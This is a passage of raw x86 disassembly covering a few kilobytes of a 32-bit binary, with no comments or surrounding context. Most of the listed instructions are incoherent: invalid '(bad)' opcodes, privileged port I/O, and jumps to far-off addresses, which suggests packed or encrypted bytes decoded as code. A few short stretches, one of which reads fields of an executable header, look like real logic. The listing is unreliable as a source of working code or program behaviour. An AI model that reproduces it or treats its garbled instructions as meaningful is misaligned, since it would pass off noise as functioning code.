  406621:	call   DWORD PTR [edx+eax*2]
  406624:	sbb    edi,DWORD PTR [edx-0x30]
  406627:	jmp    FWORD PTR [edi+0x40f9fb0e]
  40662d:	push   ebx
  40662e:	pop    ds
  40662f:	fs xchg ebp,eax
  406631:	mov    WORD PTR [ecx],fs
  406633:	fisttp QWORD PTR [esi-0x102fb79d]
  406639:	fs pop esp
  40663b:	dec    ebx
  40663d:	inc    ebp
  40663e:	daa    
  40663f:	les    ebp,FWORD PTR [edi]
  406641:	push   edi
  406642:	and    DWORD PTR [eax],edi
  406644:	lods   eax,DWORD PTR ds:[esi]
  406645:	cli    
  406646:	retf   
  406647:	xchg   edi,eax
  406648:	add    eax,0x9fd32b8f
  40664d:	mov    DWORD PTR ds:0x850f7e9,esp
  406653:	mov    edi,0x105f911
  406658:	(bad)  [ecx+0x3da5ec51]
  40665e:	scas   al,BYTE PTR es:[edi]
  40665f:	jecxz  0x406668
  406661:	mov    dh,0x5d
  406663:	sub    bh,ch
  406665:	inc    esp
  406666:	rol    BYTE PTR [esi],cl
  406668:	mul    BYTE PTR [esi-0x1de5ad91]
  40666e:	or     BYTE PTR [ecx+0x26f4dc42],dh
  406674:	pop    es
  406675:	sti    
  406676:	enter  0x8b71,0x53
  40667a:	add    al,0x35
  40667c:	ja     0x406633
  40667e:	jns    0x40664b
  406680:	mov    DWORD PTR [ebp+0x14],ecx
  406683:	mov    ecx,0x9c2b8ae8
  406688:	xor    edx,ecx
  40668a:	shrd   eax,edx,0x2
  40668e:	or     eax,DWORD PTR [ebp+0x10]
  406691:	shr    edx,0x2
  406694:	mov    DWORD PTR [ebp-0x70],eax
  406697:	mov    eax,edx
  406699:	or     eax,DWORD PTR [ebp+0x14]
  40669c:	mov    DWORD PTR [ebp-0x5c],edx
  40669f:	jmp    0x406a40
  4066a4:	xchg   ecx,eax
  4066a5:	cld    
  4066a6:	pop    ebx
  4066a7:	cmp    DWORD PTR [edx+eiz*4-0x15230365],0x3466920c
  4066b2:	or     bh,0xbe
  4066b5:	cmp    edi,DWORD PTR [esi-0x413b4242]
  4066bb:	mov    esi,0xc1d59db6
  4066c0:	mov    cl,0xb1
  4066c2:	retf   0x241c
  4066c5:	mov    dl,BYTE PTR [edx+0x36]
  4066c8:	xchg   DWORD PTR [ebp+0x3e],edi
  4066cb:	sub    al,0x45
  4066cd:	cmp    DWORD PTR [ebx+ecx*4-0x44],ebp
  4066d1:	scas   al,BYTE PTR es:[edi]
  4066d2:	cmp    DWORD PTR [esi+0x3e],0x4009841a
  4066d9:	(bad)  
  4066da:	push   eax
  4066db:	dec    edi
  4066dc:	call   0xbbc5c729
  4066e1:	inc    bh
  4066e3:	mov    esp,DWORD PTR [edi-0x29ab8143]
  4066e9:	cwde   
  4066ea:	shl    BYTE PTR [ecx+0x173813e6],1
  4066f0:	pusha  
  4066f1:	inc    edx
  4066f2:	cmp    al,0xc8
  4066f4:	push   es
  4066f5:	lods   al,BYTE PTR ds:[esi]
  4066f6:	cmp    dl,BYTE PTR [ebp+0x4ddedf54]
  4066fc:	in     al,0x24
  4066fe:	mov    DWORD PTR [ebp+0x75177456],0x2ccc1c45
  406708:	jmp    0x406711
  40670a:	mov    ?,WORD PTR [edi+0x68]
  40670d:	xor    DWORD PTR [ebx],edi
  40670f:	and    bh,0x70
  406712:	stos   BYTE PTR es:[edi],al
  406713:	out    0xd9,al
  406715:	xchg   esp,eax
  406716:	xchg   ecx,eax
  406717:	cmovge eax,DWORD PTR [ecx]
  40671a:	imul   ebp,DWORD PTR [edi],0xf34e7ed5
  406720:	mov    dh,BYTE PTR [edx-0x4b65f829]
  406726:	(bad)  [ebp+0x12eacc6c]
  40672c:	pop    edi
  40672d:	jmp    0x40678a
  40672f:	inc    ebp
  406730:	test   DWORD PTR [eax-0x40666743],0x23909be4
  40673a:	test   dl,bh
  40673c:	xchg   edi,eax
  40673d:	jb     0x406719
  40673f:	mov    eax,0xf63bf4ae
  406744:	push   DWORD PTR [edi-0x41]
  406747:	xor    esp,0xffffffde
  40674a:	test   DWORD PTR [edx+0x6c630f8c],ebx
  406750:	xor    ebx,esp
  406752:	(bad)
  406757:	adc    DWORD PTR [ebp+eax*1+0x684cef10],edx
  40675e:	out    dx,eax
  40675f:	jg     0x4066f1
  406761:	mov    ds:0xed80edee,eax
  406766:	das    
  406767:	jg     0x406721
  406769:	mov    edx,0xbd2f52de
  40676e:	enter  0xb974,0xb3
  406772:	xor    cl,al
  406774:	cwde   
  406775:	xor    bl,cl
  406777:	xor    ecx,DWORD PTR [edi]
  406779:	pop    ebx
  40677a:	push   ss
  40677b:	loop   0x4067df
  40677d:	mov    ch,0x80
  40677f:	mov    ?,WORD PTR [edx]
  406781:	in     al,dx
  406782:	jnp    0x4067cb
  406784:	or     BYTE PTR [ebx-0x79],ch
  406787:	xor    dl,BYTE PTR [ebx-0x3b729472]
  40678d:	cdq    
  40678e:	lock fisubr WORD PTR [esi-0x4d9c8ac]
  406795:	sbb    DWORD PTR [esi],ebx
  406797:	aam    0x3b
  406799:	js     0x4067bc
  40679b:	pop    eax
  40679c:	ins    BYTE PTR es:[edi],dx
  40679d:	aaa    
  40679e:	inc    esp
  40679f:	dec    esi
  4067a0:	cld    
  4067a1:	fucomi st,st(1)
  4067a3:	das    
  4067a4:	js     0x4067aa
  4067a6:	jnp    0x406797
  4067a8:	xchg   ecx,eax
  4067a9:	jge    0x4067ea
  4067ab:	out    dx,al
  4067ac:	scas   eax,DWORD PTR es:[edi]
  4067ad:	in     eax,0x6
  4067af:	jno    0x4067ff
  4067b1:	iret   
  4067b2:	lock sbb dh,BYTE PTR [ebp-0x28cc82cf]
  4067b9:	sub    BYTE PTR [eax-0x41346dba],ah
  4067bf:	scas   al,BYTE PTR es:[edi]
  4067c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4067c1:	push   esp
  4067c2:	pop    ecx
  4067c3:	push   ecx
  4067c4:	cs dec edx
  4067c6:	and    dh,ch
  4067c8:	or     eax,0xc704a9b1
  4067cd:	mov    ah,0x65
  4067cf:	inc    edi
  4067d0:	xor    al,cl
  4067d2:	push   cs
  4067d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4067d4:	and    esi,DWORD PTR [ebx-0x73025454]
  4067da:	retf   
  4067db:	xchg   ebp,eax
  4067dc:	in     eax,0x25
  4067de:	dec    ebx
  4067df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4067e0:	out    0x10,al
  4067e2:	ins    DWORD PTR es:[edi],dx
  4067e3:	vxorps ymm7,ymm3,YMMWORD PTR [edx]
  4067e8:	dec    ebp
  4067e9:	imul   esp,DWORD PTR [ebp+0x44fa2ba1],0x42
  4067f0:	fmul   DWORD PTR [esi]
  4067f2:	into   
  4067f3:	out    0xbc,al
  4067f5:	aaa    
  4067f6:	and    al,0x5d
  4067f8:	add    BYTE PTR [ebx+0x2b870939],ch
  4067fe:	cli    
  4067ff:	jmp    0xf8fbc73c
  406804:	cmp    eax,0x1ce351af
  406809:	fucomp st(2)
  40680b:	or     ebp,DWORD PTR es:[eax-0x3cce1d8c]
  406812:	dec    esp
  406813:	add    dh,BYTE PTR [ecx]
  406815:	pop    ebp
  406816:	sbb    edx,edi
  406818:	sti    
  406819:	mov    bl,0x3c
  40681b:	mov    eax,0xfe37eb1e
  406820:	out    dx,al
  406821:	xchg   esi,eax
  406822:	inc    ebx
  406823:	loopne 0x4067e3
  406825:	aaa    
  406826:	cld    
  406827:	js     0x406862
  406829:	add    al,0x74
  40682b:	push   cs
  40682c:	ret    0xcb91
  40682f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406830:	ret    
  406831:	aad    0x41
  406833:	xor    DWORD PTR [ebp+edx*2+0x6ef36978],0xbf629dcb
  40683e:	gs mov edi,0x6a8be485
  406844:	inc    edi
  406845:	in     al,0x42
  406847:	add    al,0xaa
  406849:	in     al,0xae
  40684b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40684c:	inc    ecx
  40684d:	dec    ecx
  40684e:	mov    edx,0xe5714386
  406853:	pop    esi
  406854:	mov    ecx,0xba97f216
  406859:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40685a:	add    al,0x6a
  40685c:	enter  0xab97,0x3d
  406860:	cs push esp
  406862:	and    DWORD PTR [eax],esp
  406864:	ror    BYTE PTR [edx+eiz*4],1
  406867:	mov    al,ds:0x82d42f14
  40686c:	pop    eax
  40686d:	cmp    eax,0x9b2f9edd
  406872:	jnp    0x406818
  406874:	pusha  
  406875:	into   
  406876:	push   ebp
  406877:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406878:	push   ebp
  406879:	imul   esp,ebp,0xffffffac
  40687c:	test   cl,dl
  40687e:	mov    ecx,0xac578bb4
  406883:	cmp    DWORD PTR [edi],esi
  406885:	repz sub DWORD PTR [ebx+0x31],edx
  406889:	stc    
  40688a:	les    edi,FWORD PTR [edi+0x460d421c]
  406890:	dec    ebp
  406891:	repz ror BYTE PTR [edi+0xf798e7f],cl
  406898:	addr16 push ss
  40689a:	push   0xd83e83ad
  40689f:	and    al,0x62
  4068a1:	clc    
  4068a2:	mov    cl,0x0
  4068a4:	mov    ch,BYTE PTR [edx-0x5ee8ae35]
  4068aa:	or     dl,BYTE PTR [edi+0x167b054a]
  4068b0:	cmp    ebp,eax
  4068b2:	inc    esi
  4068b3:	call   0x35d3615b
  4068b8:	xchg   edx,eax
  4068b9:	add    dh,BYTE PTR [eax-0x16]
  4068bc:	cmp    DWORD PTR [esi],esp
  4068be:	pop    edx
  4068bf:	mov    bl,0x34
  4068c1:	pop    ebp
  4068c2:	push   ss
  4068c3:	fwait
  4068c4:	loop   0x40692a
  4068c6:	mov    edi,0xdc4d8744
  4068cb:	jecxz  0x406948
  4068cd:	std    
  4068ce:	icebp  
  4068cf:	add    DWORD PTR [eax-0x34],ebp
  4068d2:	jg     0x406923
  4068d4:	add    BYTE PTR [edi+eiz*2+0x2c],bl
  4068d8:	inc    esi
  4068d9:	in     eax,0x70
  4068db:	lods   eax,DWORD PTR ds:[esi]
  4068dc:	cld    
  4068dd:	jnp    0x40693a
  4068df:	(bad)  
  4068e1:	cmp    al,dl
  4068e3:	mov    ds:0xc2da1a60,al
  4068e8:	aad    0x7f
  4068ea:	or     esp,edi
  4068ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4068ed:	add    BYTE PTR ds:[esi],0xa4
  4068f1:	cli    
  4068f2:	inc    ebp
  4068f3:	outs   dx,DWORD PTR ds:[esi]
  4068f4:	pop    esi
  4068f5:	fs xchg esp,eax
  4068f7:	xchg   DWORD PTR [esi],edx
  4068f9:	sub    bh,BYTE PTR [ebx+0x8]
  4068fc:	mov    DWORD PTR [ecx],edx
  4068fe:	xor    eax,0xeffbc59c
  406903:	arpl   WORD PTR [ebp+0x1f42ebe9],bp
  406909:	call   0x14a38a30
  40690e:	inc    eax
  40690f:	aam    0x3f
  406911:	push   ss
  406912:	sti    
  406913:	xchg   esp,eax
  406914:	cwde   
  406915:	sub    dh,BYTE PTR [ebp-0x63]
  406918:	dec    edi
  406919:	(bad)  
  40691a:	cmp    eax,0x1ad89676
  40691f:	push   es
  406920:	retf   
  406921:	push   ebx
  406922:	in     eax,dx
  406923:	lods   al,BYTE PTR ds:[esi]
  406924:	or     esp,ecx
  406926:	adc    dl,ah
  406928:	int    0x5
  40692a:	(bad)  
  40692b:	idiv   BYTE PTR [esi*4+0x6c61f50]
  406932:	sbb    bl,bh
  406934:	aas    
  406935:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406936:	cs ins BYTE PTR es:[edi],dx
  406938:	push   cs
  406939:	(bad)  
  40693a:	mov    dh,0x5f
  40693c:	sub    al,0x86
  40693e:	xlat   BYTE PTR ss:[ebx]
  406940:	(bad)  [eax+0x5110ba8]
  406946:	mul    cl
  406948:	cmp    BYTE PTR [edi-0x1e816c62],ch
  40694e:	clc    
  40694f:	cmp    eax,0xb49eb78
  406954:	mov    edx,0xb74c5076
  406959:	dec    esp
  40695a:	adc    BYTE PTR [eax],dl
  40695c:	jb     0x406997
  40695e:	add    dl,bl
  406960:	dec    edx
  406961:	into   
  406962:	scas   al,BYTE PTR es:[edi]
  406963:	ficom  WORD PTR [esi-0xe9119f8]
  406969:	push   0x1f
  40696b:	or     DWORD PTR [edi+ecx*8],ecx
  40696e:	(bad)  
  40696f:	lods   eax,DWORD PTR ds:[esi]
  406970:	sbb    al,0xbd
  406972:	pop    ds
  406973:	xchg   BYTE PTR ds:0x450fed79,ah
  406979:	pop    eax
  40697a:	out    dx,eax
  40697b:	jge    0x40697a
  40697d:	mov    cl,BYTE PTR [ebx]
  40697f:	ret    
  406980:	and    dh,BYTE PTR [edx-0x333b4383]
  406986:	popf   
  406987:	cmp    eax,0x43a680ab
  40698c:	mov    bh,0x59
  40698e:	mov    bl,0x69
  406990:	std    
  406991:	mov    cl,0xfb
  406993:	xor    dl,BYTE PTR [edi]
  406995:	scas   al,BYTE PTR es:[edi]
  406996:	mov    dl,BYTE PTR [edx+0x7f761d6a]
  40699c:	push   cs
  40699d:	int    0xe4
  40699f:	ficomp WORD PTR [ebx+0x1e]
  4069a2:	lods   eax,DWORD PTR ds:[esi]
  4069a3:	mov    dl,0xa4
  4069a5:	out    0xf5,eax
  4069a7:	data16 ins BYTE PTR es:[edi],dx
  4069a9:	push   ecx
  4069aa:	loope  0x406a1b
  4069ac:	sub    eax,0xf0f2bbe1
  4069b1:	mov    edx,0xc39f1e81
  4069b6:	les    esp,FWORD PTR [ecx+ebx*8-0x7dde97a9]
  4069bd:	push   ds
  4069be:	aad    0x2d
  4069c0:	add    bh,bl
  4069c2:	xchg   esi,eax
  4069c3:	mov    bh,0x39
  4069c5:	xor    ebp,DWORD PTR [ebp+0x424766fa]
  4069cb:	xor    BYTE PTR [ebx],0xa0
  4069ce:	inc    esp
  4069cf:	pop    esi
  4069d0:	jae    0x406962
  4069d2:	test   DWORD PTR [edi+0x14333d5f],eax
  4069d8:	(bad)  
  4069da:	cmp    eax,0x70d05f03
  4069df:	sbb    al,ah
  4069e1:	xchg   esi,eax
  4069e2:	sbb    dl,BYTE PTR [ecx-0x599ea1e1]
  4069e8:	sar    DWORD PTR [ebp+0x14b8869b],0xb1
  4069ef:	sti    
  4069f0:	add    al,0x59
  4069f2:	mov    al,0xd4
  4069f4:	sbb    ebp,edi
  4069f6:	jg     0x4069bd
  4069f8:	pop    ecx
  4069f9:	adc    dh,BYTE PTR [edi]
  4069fb:	fimul  DWORD PTR [eax+0x74]
  4069fe:	jmp    DWORD PTR [ecx-0xf]
  406a01:	data16 fbstp TBYTE PTR [ebx+edx*1-0x3a]
  406a06:	push   0x8aba26e3
  406a0b:	sub    DWORD PTR [esi-0x2f9da53a],edx
  406a11:	retf   
  406a12:	jecxz  0x406a36
  406a14:	pop    ss
  406a15:	xor    al,0x86
  406a17:	jns    0x406a56
  406a19:	dec    ebx
  406a1a:	pop    eax
  406a1b:	and    DWORD PTR [ecx-0x67],ebx
  406a1e:	adc    DWORD PTR ds:0x8fbafba5,ebp
  406a24:	dec    edx
  406a25:	pusha  
  406a26:	(bad)  
  406a27:	(bad)  
  406a28:	sar    DWORD PTR [esi+0xc],1
  406a2b:	in     eax,dx
  406a2c:	mov    ecx,0xef0e533e
  406a31:	sbb    esp,edx
  406a33:	dec    edi
  406a34:	dec    eax
  406a35:	ins    DWORD PTR es:[edi],dx
  406a36:	mov    esi,0x84e55d1d
  406a3b:	cwde   
  406a3c:	or     eax,0x896d391d
  406a41:	inc    ebp
  406a42:	xchg   esp,eax
  406a43:	mov    eax,DWORD PTR [ebp-0x70]
  406a46:	cmp    DWORD PTR [ebp-0x68],eax
  406a49:	jne    0x406a5b
  406a4f:	mov    eax,DWORD PTR [ebp-0x6c]
  406a52:	cmp    DWORD PTR [ebp-0x64],eax
  406a55:	je     0x406a96
  406a5b:	mov    eax,DWORD PTR [ebp+0x8]
  406a5e:	mov    edx,DWORD PTR [ebp+0xc]
  406a61:	mov    edx,DWORD PTR [ebp-0x4]
  406a64:	mov    edx,DWORD PTR [edx+0x3c]
  406a67:	lea    eax,[edx+eax*8+0x78]
  406a6b:	mov    edx,DWORD PTR [ebp-0x4]
  406a6e:	mov    eax,DWORD PTR [edx+eax*1]
  406a71:	mov    DWORD PTR [ebp-0x24],eax
  406a74:	mov    eax,DWORD PTR [esi]
  406a76:	mov    edx,DWORD PTR [esi+0x4]
  406a79:	shrd   eax,edx,0x2
  406a7d:	mov    DWORD PTR [ebp+0x14],eax
  406a80:	mov    eax,DWORD PTR [esi]
  406a82:	xor    DWORD PTR [ebp+0x14],edi
  406a85:	shr    edx,0x2
  406a88:	mov    edx,DWORD PTR [esi+0x4]
  406a8b:	xor    edx,edx
  406a8d:	shl    eax,0x1e
  406a90:	or     edx,DWORD PTR [ebp+0x14]
  406a93:	mov    DWORD PTR [ebp-0x28],edx
  406a96:	mov    eax,DWORD PTR [ebp-0x24]
  406a99:	mov    eax,DWORD PTR [ebp-0x24]
  406a9c:	xor    edx,edx
  406a9e:	shld   edx,eax,0x2
  406aa2:	xor    edx,ecx
  406aa4:	mov    DWORD PTR [ebp+0xc],edx
  406aa7:	mov    edx,DWORD PTR [esi]
  406aa9:	shl    eax,0x2
  406aac:	jmp    0x406e4d
  406ab1:	stos   BYTE PTR es:[edi],al
  406ab2:	outs   dx,BYTE PTR ds:[esi]
  406ab3:	jne    0x406a9b
  406ab5:	mov    ecx,0x99b2bae5
  406aba:	add    ebp,DWORD PTR [esi-0x23]
  406abd:	xchg   edi,eax
  406abe:	pop    es
  406abf:	pop    esi
  406ac0:	sahf   
  406ac1:	mov    ebp,0xbdbebe41
  406ac6:	les    edi,FWORD PTR [esi+0x49d2efbe]
  406acc:	mov    DWORD PTR [ebp+0x5ad764f2],ebp
  406ad2:	mov    ds:0x6feb1cf7,al
  406ad7:	adc    esi,DWORD PTR [ebp+0x258e0f]
  406add:	mov    ds:0xf651d571,al
  406ae2:	(bad)  
  406ae3:	xchg   DWORD PTR [ebx],edi
  406ae5:	sbb    ah,BYTE PTR [edx-0x18]
  406ae8:	jbe    0x406b31
  406aea:	or     cl,cl
  406aec:	push   ss
  406aed:	das    
  406aee:	leave  
  406aef:	mov    esp,ebp
  406af1:	cs xchg ecx,eax
  406af3:	repz sub eax,0xcc370b09
  406af9:	aas    
  406afa:	xor    eax,0xdd79eff2
  406aff:	add    al,0x5c
  406b01:	es dec eax
  406b03:	add    al,0xe0
  406b05:	rcl    DWORD PTR [eax-0x1b85efd6],0x31
  406b0c:	int    0x94
  406b0e:	imul   esi,DWORD PTR ds:0x7bd2ad3b,0x63
  406b15:	hlt    
  406b16:	sub    eax,eax
  406b18:	adc    al,0x70
  406b1a:	cmp    eax,0x2f884604
  406b1f:	mov    ds:0xc3539f0c,al
  406b24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b25:	pop    es
  406b26:	and    BYTE PTR [ebx-0x4ead1e86],al
  406b2c:	push   edi
  406b2d:	lods   eax,DWORD PTR ds:[esi]
  406b2e:	popa   
  406b2f:	loope  0x406ad1
  406b31:	outs   dx,BYTE PTR ds:[esi]
  406b32:	ins    DWORD PTR es:[edi],dx
  406b33:	jbe    0x406b2e
  406b35:	int3   
  406b36:	jmp    0x8bf5bd59
  406b3b:	mov    ds:0x20e9a338,al
  406b40:	sub    al,0xda
  406b42:	push   es
  406b43:	idiv   esp
  406b45:	push   edx
  406b46:	mov    esp,eax
  406b48:	jmp    0x406ae2
  406b4a:	mov    BYTE PTR [esi+eiz*4-0xbd0cfe9],al
  406b51:	(bad)  
  406b53:	lods   eax,DWORD PTR ds:[esi]
  406b54:	dec    ebx
  406b55:	ds mov ah,0xb7
  406b58:	js     0x406bcd
  406b5a:	pop    eax
  406b5b:	mov    esi,0x8f467ce5
  406b60:	enter  0xe5cd,0xc8
  406b64:	inc    eax
  406b65:	ins    DWORD PTR es:[edi],dx
  406b66:	mov    ds:0x90a23180,eax
  406b6b:	fwait
  406b6c:	das    
  406b6d:	out    dx,eax
  406b6e:	in     al,dx
  406b6f:	push   ebx
  406b70:	sub    al,0x8c
  406b72:	(bad)  
  406b73:	or     eax,0x528c58ec
  406b78:	inc    edx
  406b79:	out    0x54,al
  406b7b:	or     BYTE PTR [ecx-0x73],0x29
  406b7f:	xor    DWORD PTR [esi+0x20210603],eax
  406b85:	out    dx,al
  406b86:	cmp    eax,0x4cf0f073
  406b8b:	outs   dx,BYTE PTR ds:[esi]
  406b8c:	das    
  406b8d:	dec    esi
  406b8e:	xor    esp,DWORD PTR [eax+0x7b6ceac6]
  406b94:	ins    DWORD PTR es:[edi],dx
  406b95:	cli    
  406b96:	lods   al,BYTE PTR ds:[esi]
  406b97:	les    esi,FWORD PTR [ebp+0x40]
  406b9a:	jno    0x406ba5
  406b9c:	add    bl,BYTE PTR [ebp+ebx*1+0x51]
  406ba0:	ds xchg edx,eax
  406ba2:	pextrw edi,mm1,0xf6
  406ba6:	std    
  406ba7:	add    bl,BYTE PTR [esi-0x4c]
  406baa:	mul    BYTE PTR [edx]
  406bac:	fs out dx,eax
  406bae:	packssdw mm4,QWORD PTR [ecx]
  406bb1:	cmp    BYTE PTR [esi-0x79741ae],cl
  406bb7:	push   0xffffffca
  406bb9:	test   cl,dl
  406bbb:	mov    edi,0xb7e78bc8
  406bc0:	xchg   edi,eax
  406bc1:	imul   ebp,edx,0x6a
  406bc4:	cmp    al,0xae
  406bc7:	xlat   BYTE PTR ds:[ebx]
  406bc9:	sbb    al,0xb0
  406bcb:	and    DWORD PTR [ecx],0x56f62029
  406bd1:	and    ebp,DWORD PTR [ebx]
  406bd3:	pushf  
  406bd4:	out    dx,eax
  406bd5:	icebp  
  406bd6:	ins    BYTE PTR es:[edi],dx
  406bd7:	sbb    ebp,ebx
  406bd9:	hlt    
  406bda:	push   es
  406bdb:	sub    ebp,DWORD PTR [esp+ebp*8]
  406bde:	out    0x79,eax
  406be0:	outs   dx,BYTE PTR ds:[esi]
  406be1:	or     BYTE PTR [esi-0x42],0x9c
  406be5:	das    
  406be6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406be7:	dec    ebp
  406be8:	cmp    ebx,DWORD PTR [ecx-0x80]
  406beb:	and    DWORD PTR [esi+0x7c],ecx
  406bee:	ret    0x607a
  406bf1:	in     al,dx
  406bf2:	cmc    
  406bf3:	mov    esi,0x19d15f2c
  406bf8:	xor    BYTE PTR ds:0x9a0d1ca,0x51
  406bff:	and    BYTE PTR [edi],dh
  406c01:	fs ret 
  406c03:	push   eax
  406c04:	inc    edi
  406c05:	enter  0x697e,0x2f
  406c09:	and    al,0xd8
  406c0b:	dec    esi
  406c0c:	cli    
  406c0d:	call   0x8ff4:0x4bc43ccb
  406c14:	mov    BYTE PTR [edx],cl
  406c16:	enter  0xf706,0x20
  406c1a:	mov    edi,0x834d11f7
  406c1f:	jge    0x406c46
  406c21:	xchg   ebx,eax
  406c22:	inc    ebp
  406c23:	add    eax,0x1db66984
  406c28:	test   esi,ecx
  406c2a:	mov    edx,gs
  406c2c:	call   0x9ed5ce2f
  406c31:	dec    ebp
  406c32:	loop   0x406c09
  406c34:	jmp    0x9f6175b9
  406c39:	in     al,0x40
  406c3b:	dec    edx
  406c3c:	cmc    
  406c3d:	inc    ebp
  406c3e:	push   esi
  406c3f:	mov    BYTE PTR [ecx],dl
  406c41:	adc    DWORD PTR ds:0xbaca780d,esp
  406c47:	loope  0x406c25
  406c49:	jne    0x406cb8
  406c4b:	inc    edi
  406c4c:	and    eax,0xc4aadc73
  406c51:	mov    esp,0xc730b01d
  406c56:	in     eax,0xfb
  406c58:	in     al,dx
  406c59:	cmp    ebp,DWORD PTR [eax+0x3dab5310]
  406c5f:	sbb    BYTE PTR [ecx],bh
  406c61:	nop
  406c62:	add    ebx,0xffffff9b
  406c65:	and    edx,0x32
  406c68:	adc    DWORD PTR [edx],eax
  406c6a:	(bad)  
  406c6b:	xor    eax,0xc0138f20
  406c70:	cmp    DWORD PTR [ecx+edi*4],edi
  406c73:	or     BYTE PTR [esi],ah
  406c75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c76:	adc    dl,dl
  406c78:	pop    esi
  406c79:	inc    edi
  406c7a:	sbb    al,0xb4
  406c7c:	arpl   WORD PTR [esi-0xd],bx
  406c7f:	pop    DWORD PTR [edi]
  406c81:	cs inc edx
  406c83:	int3   
  406c84:	pop    ds
  406c85:	dec    esp
  406c86:	mov    ebp,0xd7504e75
  406c8b:	cmp    al,BYTE PTR [edx-0x57d635e5]
  406c91:	in     al,dx
  406c92:	or     DWORD PTR [esi*4-0x571ba016],0x5367f783
  406c9d:	pop    ebp
  406c9e:	aad    0xf8
  406ca0:	imul   esp,DWORD PTR ss:[edx-0x654f3c08],0x67
  406ca8:	leave  
  406ca9:	and    al,0x8f
  406cab:	stos   DWORD PTR es:[edi],eax
  406cac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406cad:	loope  0x406c91
  406caf:	adc    al,0xce
  406cb1:	dec    ax
  406cb3:	les    cx,DWORD PTR [edx+eax*4+0x17]
  406cb8:	xchg   edi,eax
  406cb9:	fcmovne st,st(0)
  406cbb:	(bad)  
  406cbc:	xchg   ebp,eax
  406cbd:	push   cs
  406cbe:	pop    edi
  406cbf:	pop    ds
  406cc0:	mov    bl,0x55
  406cc2:	shr    ch,0xce
  406cc5:	mov    edx,0x8b11b4fd
  406cca:	add    ecx,0xffffff80
  406ccd:	in     eax,dx
  406cce:	cld    
  406ccf:	mov    esi,0x60d0de3c
  406cd4:	add    edi,eax
  406cd6:	aas    
  406cd7:	pop    ss
  406cd8:	jno    0x406ca7
  406cda:	or     eax,0x84cfbe2e
  406cdf:	cmc    
  406ce0:	xor    BYTE PTR [edx-0x15faee4a],ah
  406ce6:	push   ebx
  406ce7:	neg    dl
  406ce9:	adc    DWORD PTR [edx],eax
  406ceb:	dec    ebp
  406cec:	sub    dl,al
  406cee:	aas    
  406cef:	add    DWORD PTR [eax+0x66],esi
  406cf2:	xchg   ebx,eax
  406cf3:	es push ebp
  406cf5:	lahf   
  406cf6:	imul   edx,DWORD PTR [ebx-0x54],0x75310abd
  406cfd:	jae    0x406c90
  406cff:	out    dx,eax
  406d00:	pop    ds
  406d01:	sbb    eax,DWORD PTR [ebp+0x404c5b9a]
  406d07:	(bad)
  406d0a:	cmp    edx,edx
  406d0c:	mov    ch,0x6d
  406d0e:	repnz or ebx,esp
  406d11:	nop
  406d12:	cmp    al,0xef
  406d14:	les    ebp,FWORD PTR [esi]
  406d16:	mov    eax,0xab7c3203
  406d1b:	jno    0x406d48
  406d1d:	jae    0x406d20
  406d1f:	pop    esi
  406d20:	cmp    eax,0xbed34e67
  406d25:	push   ebx
  406d26:	lahf   
  406d27:	mov    ecx,fs
  406d29:	sub    DWORD PTR [eax],edx
  406d2b:	xchg   BYTE PTR [bx+si-0x1b0e],ch
  406d30:	fcmovnb st,st(7)
  406d32:	pop    edx
  406d33:	sbb    al,0x16
  406d35:	sahf   
  406d36:	jb     0x406d45
  406d38:	adc    cl,BYTE PTR [ebp-0x31]
  406d3b:	fadd   QWORD PTR [ebp-0x52]
  406d3e:	jp     0x406ccc
  406d40:	repnz test BYTE PTR [ebx+eax*1-0x33],cl
  406d45:	pop    edi
  406d46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406d47:	dec    ecx
  406d48:	jle    0x406d9a
  406d4a:	sub    DWORD PTR [edi+0x78],edi
  406d4d:	xor    al,0x4f
  406d4f:	or     al,0x94
  406d51:	inc    ebp
  406d52:	or     al,0xba
  406d54:	mov    ah,BYTE PTR [eax-0xa4f563e]
  406d5a:	fisttp QWORD PTR [ebx+edx*2]
  406d5d:	jge    0x406d08
  406d5f:	jo     0x406cf9
  406d61:	sbb    BYTE PTR [edi],0x2d
  406d64:	sbb    al,0xef
  406d66:	mov    cl,0x74
  406d68:	std    
  406d69:	adc    al,0x6b
  406d6b:	call   0xe841c5ee
  406d70:	inc    edi
  406d71:	(bad)  
  406d72:	loope  0x406dd0
  406d74:	push   0x2a07cf95
  406d79:	mov    al,ds:0xa5560d43
  406d7e:	jne    0x406dea
  406d80:	pop    edi
  406d81:	xchg   ebx,edi
  406d83:	bswap  ebx
  406d85:	int    0x93
  406d87:	cli    
  406d88:	or     edi,DWORD PTR [edi]
  406d8a:	enter  0x231a,0x81
  406d8e:	pusha  
  406d8f:	iret   
  406d90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d91:	repnz imul edx,DWORD PTR [eax+esi*1-0x3],0x9dbb04fb
  406d9a:	sub    bh,BYTE PTR [edx+esi*8+0x246eb7ad]
  406da1:	sbb    DWORD PTR [ebp+0x7c8b069b],0x6f0d4dff
  406dab:	push   ebx
  406dac:	(bad)  [ebx]
  406dae:	or     BYTE PTR [esi-0x12af82ef],cl
  406db4:	add    bl,BYTE PTR ds:0x1fd0fc25
  406dba:	add    cl,bl
  406dbc:	dec    edx
  406dbd:	fisubr WORD PTR [edx+0x481f2ac9]
  406dc3:	fwait
  406dc4:	retf   
  406dc5:	push   0x42907f75
  406dca:	jle    0x406ddb
  406dcc:	sub    eax,0xa14d0aa8
  406dd1:	jg     0x406dbf
  406dd3:	mov    BYTE PTR [eax+0x2d78b4b5],dl
  406dd9:	adc    DWORD PTR [esi],ecx
  406ddb:	mov    ds:0xfbc5493d,eax
  406de0:	hlt    
  406de1:	test   eax,0x9a639ad2
  406de6:	outs   dx,DWORD PTR ds:[esi]
  406de7:	sub    ebp,DWORD PTR [edx]
  406de9:	inc    esi
